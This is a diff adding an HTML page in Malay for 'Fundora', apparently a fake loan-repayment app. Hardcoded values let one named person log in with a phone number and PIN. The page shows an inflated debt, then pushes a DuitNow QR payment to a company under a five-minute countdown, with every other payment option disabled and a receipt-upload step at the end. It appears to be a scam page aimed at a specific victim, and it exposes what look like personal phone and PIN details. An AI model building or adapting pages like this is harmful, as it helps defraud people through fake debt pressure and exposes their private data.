@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fundora - Sistem Pembayaran Interaktif</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        navGreen: '#004d40',
+                        bgGreen: '#00c853',
+                        brandGreen: '#005d4b',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        /* Sembunyikan anak panah pada input nombor PIN */
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        input[type=number] {
+            -moz-appearance: textfield;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 font-sans antialiased min-h-screen relative overflow-x-hidden">
+
+    <nav class="bg-navGreen text-white px-4 py-3 flex items-center justify-between shadow-md sticky top-0 z-40">
+        <div class="flex items-center space-x-2">
+            <img src="IMG_6319.png" alt="Fundora Logo" class="w-8 h-8 rounded-full object-cover bg-white">
+            <span class="font-semibold text-lg tracking-wide">Fundora</span>
+        </div>
+        <div class="flex items-center space-x-3 text-sm font-medium">
+            <div class="flex items-center space-x-1 text-gray-200 cursor-pointer">
+                <span>BM</span>
+                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+                </svg>
+            </div>
+            <button class="text-white focus:outline-none pl-1">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+                </svg>
+            </button>
+        </div>
+    </nav>
+
+
+    <div id="page1" class="page-section flex flex-col min-h-[calc(100-screen-64px)]">
+        <div class="relative bg-gradient-to-r from-teal-900 to-emerald-900 text-white text-center py-12 px-6 bg-cover bg-center" style="background-image: linear-gradient(to bottom, rgba(0,77,64,0.85), rgba(4,120,87,0.9)), url('https://images.unsplash.com/photo-1542362567-b07eac79094d?w=800');">
+            <h2 class="text-xl md:text-2xl font-bold max-w-md mx-auto leading-snug">Pinjaman Pintar. Masa Depan Lebih Pantas.</h2>
+            <p class="text-xs text-gray-300 mt-2 max-w-xs mx-auto">Penilaian risiko pintar dan kelulusan cekap kami menjadikan proses pinjaman lebih mudah dan cepat.</p>
+            <button onclick="document.getElementById('loanCard').scrollIntoView({behavior: 'smooth'})" class="mt-5 border border-white px-6 py-2 rounded-xl text-xs font-semibold bg-white/10 hover:bg-white/20 transition">Mohon Sekarang</button>
+        </div>
+
+        <main id="loanCard" class="flex-1 bg-white max-w-md w-full mx-auto px-5 py-8 space-y-6">
+            <div class="bg-[#004d40] text-white text-center py-4 rounded-2xl font-bold text-lg shadow-sm">
+                Dapatkan Dana Sekarang
+            </div>
+            <div class="text-center space-y-1">
+                <span class="text-xs text-gray-500 font-semibold block">Jumlah Pinjaman</span>
+                <h1 class="text-3xl font-black text-emerald-800">RM 1,000</h1>
+            </div>
+            <div class="px-2">
+                <input type="range" min="250" max="5000" value="1000" disabled class="w-full h-2 bg-gray-200 rounded-lg appearance-none accent-teal-600">
+                <div class="flex justify-between text-[11px] text-gray-400 font-bold mt-1">
+                    <span>250</span>
+                    <span>5000</span>
+                </div>
+            </div>
+            <div class="border border-gray-200 rounded-xl p-3.5 shadow-sm">
+                <label class="block text-xs text-gray-400 font-medium mb-1">Nombor Telefon</label>
+                <div class="flex items-center space-x-2">
+                    <span class="text-gray-700 font-semibold text-sm border-r pr-2 border-gray-200">🇲🇾 +60</span>
+                    <input type="tel" id="mainPhoneInput" placeholder="Masukkan Nombor Telefon" class="w-full bg-transparent font-medium text-gray-800 text-sm focus:outline-none" value="0194359546">
+                </div>
+            </div>
+            <button onclick="verifyMainPhone()" class="w-full bg-[#005d4b] hover:bg-teal-900 text-white font-bold py-3.5 rounded-xl shadow-md transition text-sm">Mohon Sekarang</button>
+        </main>
+    </div>
+
+
+    <div id="page2" class="page-section hidden flex-col min-h-[calc(100-screen-64px)] relative">
+        <div id="loginMainArea" class="flex-1 bg-gradient-to-b from-[#00c853] to-[#00796b] flex flex-col items-center justify-center px-6 py-12 text-center transition duration-300">
+            <div class="w-full max-w-sm space-y-8">
+                <div class="flex flex-col items-center space-y-3">
+                    <img src="IMG_6319.png" alt="Fundora Logo" class="w-20 h-20 rounded-full object-cover bg-white shadow-lg">
+                    <span class="text-3xl font-black text-white tracking-wide">Fundora</span>
+                </div>
+                <h2 class="text-white text-xl font-bold">Selamat Datang Kembali</h2>
+                
+                <div class="bg-white text-left rounded-xl p-3.5 shadow-lg">
+                    <label class="block text-xs text-gray-400 font-medium mb-1">Nombor Telefon</label>
+                    <div class="flex items-center space-x-2">
+                        <span class="text-gray-700 font-bold text-sm border-r pr-2 border-gray-200">🇲🇾 +60</span>
+                        <input type="tel" id="loginPhoneInput" readonly class="w-full bg-transparent text-gray-800 font-bold text-sm focus:outline-none">
+                    </div>
+                </div>
+                <p class="text-[11px] text-white/90">Dengan mendaftar, anda bersetuju dengan Fundora <span class="font-bold underline">Terma & Syarat</span>.</p>
+                <button onclick="triggerPinPopup()" class="w-full bg-[#40ff53] hover:bg-[#32e044] text-teal-950 font-black py-3.5 rounded-xl shadow-lg text-sm uppercase tracking-wider">Log Masuk</button>
+            </div>
+        </div>
+
+        <div id="pinModal" class="absolute inset-0 bg-black/40 z-50 flex flex-col justify-end hidden">
+            <div class="bg-white w-full rounded-t-3xl p-6 space-y-5 max-w-md mx-auto shadow-2xl relative">
+                <button onclick="closePinPopup()" class="absolute left-6 top-6 bg-emerald-50 text-emerald-800 p-2 rounded-md">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"></path></svg>
+                </button>
+                <div class="flex justify-center pt-2">
+                    <div class="bg-gradient-to-br from-[#00e676] to-[#00b0ff] text-white p-3.5 rounded-2xl shadow-md">
+                        <svg class="w-7 h-7" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+                    </div>
+                </div>
+                <div class="text-center space-y-1">
+                    <h3 class="text-lg font-bold text-gray-900">Masukkan PIN untuk Log Masuk</h3>
+                    <p class="text-xs text-gray-400 font-medium">Untuk log masuk ke Fundora dengan selamat</p>
+                </div>
+                <div class="flex justify-center space-x-2" id="pinContainer">
+                    <input type="number" pattern="\d*" maxlength="1" class="w-11 h-12 text-center text-lg font-bold bg-gray-50 border rounded-xl focus:outline-none focus:ring-2 focus:ring-emerald-400" />
+                    <input type="number" pattern="\d*" maxlength="1" class="w-11 h-12 text-center text-lg font-bold bg-gray-50 border rounded-xl focus:outline-none focus:ring-2 focus:ring-emerald-400" />
+                    <input type="number" pattern="\d*" maxlength="1" class="w-11 h-12 text-center text-lg font-bold bg-gray-50 border rounded-xl focus:outline-none focus:ring-2 focus:ring-emerald-400" />
+                    <input type="number" pattern="\d*" maxlength="1" class="w-11 h-12 text-center text-lg font-bold bg-gray-50 border rounded-xl focus:outline-none focus:ring-2 focus:ring-emerald-400" />
+                    <input type="number" pattern="\d*" maxlength="1" class="w-11 h-12 text-center text-lg font-bold bg-gray-50 border rounded-xl focus:outline-none focus:ring-2 focus:ring-emerald-400" />
+                    <input type="number" pattern="\d*" maxlength="1" class="w-11 h-12 text-center text-lg font-bold bg-gray-50 border rounded-xl focus:outline-none focus:ring-2 focus:ring-emerald-400" />
+                </div>
+                <div class="text-center pb-2"><a href="#" class="text-xs font-bold text-gray-500 underline">Lupa PIN</a></div>
+            </div>
+        </div>
+    </div>
+
+
+    <div id="page3" class="page-section hidden flex-col bg-white min-h-[calc(100-screen-64px)]">
+        <div class="bg-[#00c853] text-white px-5 pt-6 pb-8 space-y-6">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center space-x-3">
+                    <div class="w-11 h-11 bg-white/30 rounded-full flex items-center justify-center font-bold text-sm border border-white/20">MO</div>
+                    <div class="flex flex-col">
+                        <span class="font-extrabold text-base leading-tight">Hai MOHAMMAD</span>
+                        <span class="text-[11px] text-white/80">Selamat kembali ke Fundora</span>
+                    </div>
+                </div>
+                <button class="bg-white/20 p-2 rounded-xl relative">
+                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M10 2a6 6 0 00-6 6v3.586l-.707.707A1 1 0 004 14h12a1 1 0 00.707-1.707L16 11.586V8a6 6 0 00-6-6zM10 18a3 3 0 01-3-3h6a3 3 0 01-3 3z"></path></svg>
+                    <span class="absolute top-2 right-2 w-1.5 h-1.5 bg-white rounded-full"></span>
+                </button>
+            </div>
+            <div class="text-center space-y-1">
+                <span class="text-xs text-white/80 font-medium block">Jumlah Perlu Dibayar</span>
+                <h1 class="text-4xl font-black tracking-wide">RM 562.00</h1>
+                <div class="inline-flex items-center space-x-1 bg-black/25 rounded-full px-3 py-0.5 text-[10px] font-medium">
+                    <span>Tamat pada 2026-05-06</span>
+                </div>
+            </div>
+            <div class="space-y-2.5">
+                <div class="bg-white/10 border border-white/10 rounded-xl p-3.5 flex items-center justify-between">
+                    <span class="text-xs font-medium">Jumlah Dibayar</span>
+                    <span class="text-lg font-bold">RM 0.00</span>
+                </div>
+                <div class="bg-white/10 border border-white/10 rounded-xl p-3.5 flex items-center justify-between">
+                    <span class="text-xs font-medium">Jumlah Pinjaman</span>
+                    <span class="text-lg font-bold">RM 250.00</span>
+                </div>
+            </div>
+            <button onclick="navigateTo('page4')" class="w-full bg-[#004d40] hover:bg-[#00332c] text-white font-bold py-3.5 rounded-xl shadow-lg transition text-sm tracking-wide">Bayar Sekarang</button>
+            <p class="text-[10px] text-white/90 flex items-start space-x-1"><span class="mt-0.5">⚠️</span><span>Sila buat pembayaran sebelum tarikh tamat untuk mengelakkan penalti.</span></p>
+        </div>
+        <div class="flex-1 flex flex-col items-center justify-center p-6 text-center space-y-3 bg-white">
+            <div class="bg-[#00c853] text-white p-3 rounded-xl shadow-inner">
+                <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+            </div>
+            <h3 class="text-base font-bold text-gray-800 max-w-[200px]">Pembayaran Akan Tamat Tempoh Tidak Lama Lagi</h3>
+            <p class="text-[11px] text-gray-400 font-medium">Perlu lebih masa untuk membuat pembayaran?</p>
+        </div>
+    </div>
+
+
+    <div id="page4" class="page-section hidden flex-col bg-white min-h-[calc(100-screen-64px)] px-5 pt-4 space-y-4">
+        <span class="text-teal-800 font-bold text-xs">Bayaran Balik</span>
+        <div class="text-center py-2">
+            <span class="text-xs text-gray-400 font-semibold block">Jumlah Perlu Dibayar</span>
+            <h1 id="promoTopAmount" class="text-3xl font-black text-gray-900">RM 562.00</h1>
+        </div>
+        
+        <div class="border border-teal-100 bg-teal-50/20 rounded-2xl p-4 space-y-4">
+            <div class="bg-white rounded-xl border border-gray-100 p-5 text-center shadow-sm">
+                <span class="text-[11px] text-gray-400 font-semibold block mb-1">Jumlah Bayaran Balik</span>
+                <div class="flex items-center justify-center space-x-4">
+                    <span class="text-2xl font-black text-gray-500">RM</span>
+                    <span id="promoBoxAmount" class="text-4xl font-black text-gray-900">562</span>
+                </div>
+            </div>
+            <div class="bg-white rounded-xl border border-gray-200 p-1.5 flex items-center justify-between shadow-inner">
+                <input type="text" id="promoInput" placeholder="Kod Promo" class="w-full bg-transparent px-2 text-sm font-bold text-gray-800 uppercase focus:outline-none">
+                <button type="button" id="promoBtn" onclick="handlePromoValidation()" class="bg-[#1c1c1e] text-white text-xs font-bold px-5 py-2.5 rounded-lg transition-all">Guna</button>
+            </div>
+            <div id="promoMessage" class="text-[11px] font-bold px-1 hidden"></div>
+        </div>
+
+        <button onclick="checkPromoBeforeNext()" class="w-full bg-brandGreen hover:bg-teal-900 text-white font-bold py-3.5 rounded-xl shadow-md text-sm">Bayar Sekarang</button>
+    </div>
+
+
+    <div id="page5" class="page-section hidden flex-col bg-white min-h-[calc(100-screen-64px)] px-5 pt-5 space-y-5">
+        <div class="flex items-center space-x-3">
+            <button onclick="navigateTo('page4')" class="bg-gray-100 p-2 rounded-lg text-gray-700">
+                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"></path></svg>
+            </button>
+            <span class="text-gray-800 font-bold text-sm">Kaedah Pembayaran</span>
+        </div>
+        <div class="text-center py-2">
+            <span class="text-xs text-gray-400 font-semibold block">Jumlah untuk dibayar</span>
+            <h1 class="text-4xl font-black text-gray-900">RM 562</h1>
+        </div>
+        <div class="space-y-3.5">
+            <h3 class="text-gray-900 font-bold text-xs">Kaedah Pembayaran</h3>
+            <label onclick="alert('Kaedah pembayaran ini tidak tersedia sementara waktu.')" class="border border-gray-200 rounded-xl p-4 flex items-center x-3 cursor-pointer hover:bg-gray-50 block">
+                <input type="radio" name="pay_group" class="w-4 h-4 text-teal-600">
+                <span class="text-gray-700 font-medium text-xs ml-2">Online Banking</span>
+            </label>
+            <label onclick="alert('Kaedah pembayaran ini tidak tersedia sementara waktu.')" class="border border-gray-200 rounded-xl p-4 flex items-center x-3 cursor-pointer hover:bg-gray-50 block">
+                <input type="radio" name="pay_group" class="w-4 h-4 text-teal-600">
+                <span class="text-gray-700 font-medium text-xs ml-2">E-Wallet</span>
+            </label>
+            <label onclick="enablePage5Next()" class="border-2 border-emerald-500 bg-emerald-50/20 rounded-xl p-4 flex items-center x-3 cursor-pointer block">
+                <input type="radio" name="pay_group" id="duitNowRadio" class="w-4 h-4 text-emerald-600">
+                <span class="text-gray-900 font-bold text-xs ml-2">DuitNow</span>
+            </label>
+            <label onclick="alert('Kaedah pembayaran ini tidak tersedia sementara waktu.')" class="border border-gray-200 rounded-xl p-4 flex items-center x-3 cursor-pointer hover:bg-gray-50 block">
+                <input type="radio" name="pay_group" class="w-4 h-4 text-teal-600">
+                <span class="text-gray-700 font-medium text-xs ml-2">Bank Transfer</span>
+            </label>
+        </div>
+        <button id="page5NextBtn" onclick="navigateTo('page6')" class="w-full bg-brandGreen hover:bg-teal-900 text-white font-bold py-3.5 rounded-xl shadow-md text-sm hidden">Seterusnya</button>
+    </div>
+
+
+    <div id="page6" class="page-section hidden flex-col bg-white min-h-[calc(100-screen-64px)] px-5 pt-4 space-y-5">
+        <div class="text-center py-2">
+            <h1 class="text-4xl font-black text-gray-900 tracking-wide">RM 430</h1>
+        </div>
+        <div class="space-y-3">
+            <h3 class="text-gray-900 font-bold text-xs">Kaedah Pembayaran</h3>
+            <div class="border border-gray-100 rounded-xl p-3.5 flex items-center space-x-3 opacity-40 bg-gray-50 text-xs font-medium text-gray-500"><span>Online Banking</span></div>
+            <div class="border border-gray-100 rounded-xl p-3.5 flex items-center space-x-3 opacity-40 bg-gray-50 text-xs font-medium text-gray-500"><span>E-Wallet</span></div>
+            <div class="border-2 border-emerald-600 bg-emerald-50/40 rounded-xl p-3.5 flex items-center space-x-3 text-xs font-bold text-gray-900">
+                <div class="w-4 h-4 rounded-full bg-emerald-700 flex items-center justify-center"><div class="w-1.5 h-1.5 bg-white rounded-full"></div></div>
+                <span>DuitNow</span>
+            </div>
+            <div class="border border-gray-100 rounded-xl p-3.5 flex items-center space-x-3 opacity-40 bg-gray-50 text-xs font-medium text-gray-500"><span>Bank Transfer</span></div>
+        </div>
+
+        <form id="dropdownForm" onsubmit="handleBankSelection(event)" class="space-y-4 pt-2">
+            <div>
+                <label class="text-gray-900 font-bold text-xs block mb-1">Saluran Pembayaran</label>
+                <div class="bg-gray-50 border border-gray-200 rounded-xl p-3 shadow-sm relative">
+                    <span class="block text-[10px] text-gray-400 font-bold">Saluran</span>
+                    <span class="text-gray-800 font-extrabold text-xs">DuitNow</span>
+                </div>
+            </div>
+            <div>
+                <label class="text-gray-900 font-bold text-xs block mb-1">Bank Pembayaran</label>
+                <div class="bg-white border border-gray-200 rounded-xl p-3 shadow-sm focus-within:border-emerald-500 relative">
+                    <label for="bankSelect" class="block text-[10px] text-gray-400 font-bold mb-0.5">Bank</label>
+                    <select id="bankSelect" required class="w-full bg-transparent text-gray-900 font-black text-xs focus:outline-none appearance-none pr-8 cursor-pointer">
+                        <option value="" disabled selected>Sila Pilih Bank Pembayaran</option>
+                        <option value="TNG">TOUCH'N GO</option>
+                        <option value="MAYBANK">MAYBANK QRPAY</option>
+                        <option value="DUITNOW_QR">DUITNOW QR/E-WALLET PAYMENT</option>
+                        <option value="RHB">RHB QRPAY</option>
+                        <option value="GRABPAY">GRABPAY</option>
+                        <option value="BOOST">BOOST</option>
+                    </select>
+                </div>
+            </div>
+            <button type="submit" class="w-full bg-[#1c1c1e] hover:bg-black text-white font-bold py-3.5 rounded-xl shadow-md text-xs uppercase tracking-wide">Bayar Sekarang</button>
+        </form>
+    </div>
+
+
+    <div id="page7" class="page-section hidden flex-col items-center justify-center p-4 min-h-[calc(100-screen-64px)]">
+        <div class="bg-white w-full max-w-sm rounded-3xl shadow-xl border border-gray-100 p-5 text-center space-y-5">
+            <div class="flex justify-between items-center text-[10px] text-gray-500 font-bold border-b pb-3">
+                <div class="text-left"><span class="block text-gray-300 text-[8px] uppercase">Reference No.</span><span class="text-gray-800 text-xs font-black">FDR_12931905</span></div>
+                <div class="text-right"><span class="block text-gray-300 text-[8px] uppercase">Transaction Time</span><span class="text-gray-800 font-medium">2026-05-30 15:39:12</span></div>
+            </div>
+            
+            <div class="flex justify-center">
+                <img src="IMG_6319.png" alt="Fundora Brand" class="w-16 h-16 rounded-full object-cover shadow-sm bg-gray-50">
+            </div>
+
+            <div class="space-y-0.5">
+                <span class="text-[10px] text-gray-400 font-bold uppercase block">Please Pay</span>
+                <div class="text-gray-900 font-black text-xl">MYR 430.00 <span class="text-xs text-gray-400 font-bold">ONLY</span></div>
+            </div>
+            <div class="bg-[#e91e63] rounded-2xl p-3 shadow-inner">
+                <div class="bg-white rounded-xl p-4 flex flex-col items-center justify-center space-y-2">
+                    <img id="finalQrFrame" src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=DuitNow_Fundora_Payment_RM430" alt="DuitNow QR" class="w-40 h-40 object-contain">
+                    <span class="text-[9px] text-gray-400 font-bold uppercase">One Time Use, Valid Till 2026-05-30 15:44:09</span>
+                    <div class="text-gray-800 pt-1"><div class="text-lg font-black">CAVIRO SDN BHD</div><div class="text-xs font-bold text-gray-400">(RHB)</div></div>
+                </div>
+                <div class="mt-3 bg-white/95 rounded-lg py-1.5 px-3 inline-block"><span class="block text-[9px] text-red-500 font-bold uppercase">Time Remaining</span><span id="liveTimer" class="text-base font-black text-red-600">4m 59s</span></div>
+            </div>
+            <p class="text-[11px] text-gray-500 font-medium">Scan the QR code and complete the payment.<br>This payment valid for <span class="text-red-500 font-bold">ONE TIME</span> use only</p>
+            
+            <div id="finalActionContainer" class="space-y-2">
+                <button type="button" onclick="openReceiptModal()" class="w-full bg-[#004d40] hover:bg-teal-950 text-white font-bold py-3 rounded-xl shadow-md text-xs">Selesai Buat Bayaran</button>
+                <button type="button" onclick="if(confirm('Batalkan transaksi?')) location.reload();" class="w-full border border-gray-300 text-gray-400 py-2 rounded-xl text-[10px] uppercase font-bold">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+
+    <div class="fixed bottom-5 right-5 z-40">
+        <button onclick="alert('Pusat bantuan kami sedang dikemas kini.')" class="bg-[#00796b] text-white p-3.5 rounded-full shadow-xl flex items-center justify-center">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 14c0-4.97 4.03-9 9-9s9 4.03 9 9M4 14h2a1 1 0 011 1v3a1 1 0 01-1 1H4a1 1 0 01-1-1v-3a1 1 0 011-1zm14 0h2a1 1 0 011 1v3a1 1 0 01-1 1h-2a1 1 0 01-1-1v-3a1 1 0 011-1z"></path></svg>
+        </button>
+    </div>
+
+
+    <div id="uploadModal" class="fixed inset-0 bg-black/60 z-50 flex items-center justify-center px-4 hidden">
+        <div class="bg-white w-full max-w-sm rounded-2xl p-5 space-y-4 text-center shadow-2xl">
+            <div class="w-10 h-10 bg-teal-50 text-teal-600 rounded-full flex items-center justify-center mx-auto text-xl">📥</div>
+            <div class="space-y-0.5">
+                <h3 class="text-base font-bold text-gray-900">Muat Naik Resit Pembayaran</h3>
+                <p class="text-[11px] text-gray-500">Sila lampirkan tangkapan skrin bukti transaksi anda yang berjaya.</p>
+            </div>
+            <form id="receiptForm" onsubmit="submitReceiptForm(event)" class="space-y-3">
+                <label class="border-2 border-dashed rounded-xl p-5 flex flex-col items-center justify-center cursor-pointer bg-gray-50 hover:border-teal-500 block">
+                    <span class="text-2xl">📄</span>
+                    <span id="fileNameLabel" class="text-xs font-bold text-gray-700 mt-1 block">Pilih Fail Resit Anda</span>
+                    <input type="file" id="fileInput" required class="hidden" onchange="displayFileName(this)">
+                </label>
+                <div class="flex space-x-2 pt-1">
+                    <button type="button" onclick="closeReceiptModal()" class="w-1/2 bg-gray-100 text-gray-600 font-bold py-2.5 rounded-xl text-xs">KEMBALI</button>
+                    <button type="submit" class="w-1/2 bg-teal-800 text-white font-bold py-2.5 rounded-xl shadow-md text-xs">HANTAR BUKTI</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+
+    <script>
+        const phoneTarget = "0194359546";
+        const pinTarget = "025769";
+        const promoTarget = "FRR020731";
+        
+        let promoApplied = false;
+        let countdownInterval;
+
+        function navigateTo(pageId) {
+            document.querySelectorAll('.page-section').forEach(section => section.classList.add('hidden'));
+            document.getElementById(pageId).classList.remove('hidden');
+            window.scrollTo(0,0);
+        }
+
+        function verifyMainPhone() {
+            const inputVal = document.getElementById('mainPhoneInput').value.trim();
+            if (inputVal === phoneTarget || inputVal === "194359546") {
+                document.getElementById('loginPhoneInput').value = phoneTarget;
+                navigateTo('page2');
+            } else {
+                alert("Akses Ditolak: Nombor telefon ini tidak dibenarkan masuk.");
+            }
+        }
+
+        function triggerPinPopup() {
+            document.getElementById('loginMainArea').classList.add('blur-sm', 'pointer-events-none');
+            document.getElementById('pinModal').classList.remove('hidden');
+            setupPinAutofocus();
+        }
+
+        function closePinPopup() {
+            document.getElementById('loginMainArea').classList.remove('blur-sm', 'pointer-events-none');
+            document.getElementById('pinModal').classList.add('hidden');
+        }
+
+        function setupPinAutofocus() {
+            const pinInputs = document.querySelectorAll('#pinContainer input');
+            pinInputs.forEach(i => i.value = "");
+            pinInputs[0].focus();
+
+            pinInputs.forEach((input, index) => {
+                input.oninput = function() {
+                    if (this.value.length > 1) this.value = this.value.slice(0, 1);
+                    if (this.value !== "" && index < pinInputs.length - 1) pinInputs[index + 1].focus();
+                    
+                    let compiled = "";
+                    pinInputs.forEach(p => compiled += p.value);
+                    if (compiled.length === 6) {
+                        if (compiled === pinTarget) {
+                            closePinPopup();
+                            navigateTo('page3');
+                        } else {
+                            alert("Nombor PIN salah. Sila cuba lagi.");
+                            setupPinAutofocus();
+                        }
+                    }
+                };
+                input.onkeydown = function(e) {
+                    if (e.key === "Backspace" && this.value === "" && index > 0) pinInputs[index - 1].focus();
+                };
+            });
+        }
+
+        function handlePromoValidation() {
+            const code = document.getElementById('promoInput').value.trim().toUpperCase();
+            const msg = document.getElementById('promoMessage');
+            const btn = document.getElementById('promoBtn');
+
+            if (!promoApplied) {
+                if (code === promoTarget) {
+                    promoApplied = true;
+                    document.getElementById('promoInput').disabled = true;
+                    document.getElementById('promoTopAmount').textContent = "RM 430.00";
+                    document.getElementById('promoBoxAmount').textContent = "430";
+                    
+                    btn.textContent = "KELUARKAN";
+                    btn.className = "text-red-600 font-bold text-xs px-4 py-2 bg-transparent transition-all";
+                    
+                    msg.textContent = "Kod promo berjaya digunakan.";
+                    msg.className = "text-[11px] font-bold px-1 text-emerald-600 block";
+                } else {
+                    msg.textContent = "Kod Promo tidak sah";
+                    msg.className = "text-[11px] font-bold px-1 text-red-500 block";
+                }
+            } else {
+                promoApplied = false;
+                document.getElementById('promoInput').disabled = false;
+                document.getElementById('promoInput').value = "";
+                document.getElementById('promoTopAmount').textContent = "RM 562.00";
+                document.getElementById('promoBoxAmount').textContent = "562";
+                
+                btn.textContent = "Guna";
+                btn.className = "bg-[#1c1c1e] text-white text-xs font-bold px-5 py-2.5 rounded-lg transition-all";
+                msg.classList.add('hidden');
+            }
+        }
+
+        function checkPromoBeforeNext() {
+            if (promoApplied) {
+                navigateTo('page5');
+            } else {
+                alert("Sila masukkan dan aktifkan Kod Promo yang sah terlebih dahulu.");
+            }
+        }
+
+        function enablePage5Next() {
+            document.getElementById('page5NextBtn').classList.remove('hidden');
+        }
+
+        function handleBankSelection(e) {
+            e.preventDefault();
+            navigateTo('page7');
+            startLiveCountdown();
+        }
+
+        function startLiveCountdown() {
+            let totalSeconds = (4 * 60) + 59;
+            const timerElement = document.getElementById('liveTimer');
+            const qrElement = document.getElementById('finalQrFrame');
+            const container = document.getElementById('finalActionContainer');
+
+            if (countdownInterval) clearInterval(countdownInterval);
+
+            countdownInterval = setInterval(() => {
+                let mins = Math.floor(totalSeconds / 60);
+                let secs = totalSeconds % 60;
+                secs = secs < 10 ? '0' + secs : secs;
+
+                timerElement.textContent = `${mins}m ${secs}s`;
+
+                if (totalSeconds <= 0) {
+                    clearInterval(countdownInterval);
+                    timerElement.textContent = "Masa Telah Tamat";
+                    timerElement.className = "text-xs font-black text-red-600 block animate-pulse";
+                    qrElement.classList.add('blur-md', 'opacity-30', 'pointer-events-none');
+                    
+                    container.innerHTML = `
+                        <button type="button" onclick="openReceiptModal()" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3.5 rounded-xl shadow-md text-xs">
+                            Upload Resit Pembayaran
+                        </button>
+                    `;
+                }
+                totalSeconds--;
+            }, 1000);
+        }
+
+        function openReceiptModal() { document.getElementById('uploadModal').classList.remove('hidden'); }
+        function closeReceiptModal() { document.getElementById('uploadModal').classList.add('hidden'); }
+        
+        function displayFileName(input) {
+            if (input.files.length > 0) {
+                document.getElementById('fileNameLabel').textContent = `✔ ${input.files[0].name}`;
+                document.getElementById('fileNameLabel').className = "text-xs font-bold text-emerald-600 mt-1 block";
+            }
+        }
+
+        function submitReceiptForm(e) {
+            e.preventDefault();
+            closeReceiptModal();
+            alert("Pembayaran telah berjaya akan disemak.");
+            location.reload();
+        }
+    </script>
+</body>
+</html>
